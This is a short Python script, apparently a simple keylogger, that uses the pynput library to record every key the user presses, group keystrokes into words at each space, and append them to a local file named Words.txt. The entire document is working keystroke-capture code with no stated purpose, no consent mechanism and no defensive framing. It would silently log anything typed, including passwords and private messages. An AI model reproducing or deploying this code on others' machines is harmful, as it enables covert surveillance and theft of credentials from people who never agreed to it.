from pynput.keyboard import Key, Listener

arq = open('Words.txt')
word = []

def on_press(key):
    with open('Words.txt', 'a') as arq:
        global word
    
        if key == Key.space:
            wordToString = ""
            for x in word:
                wordToString += x
            wordToString = wordToString.replace("'", "")
            arq.write(wordToString + '\n')
            word = []
        else: 
            word.append('{0}'.format(key))

with Listener(on_press=on_press) as listener:
    listener.join()
    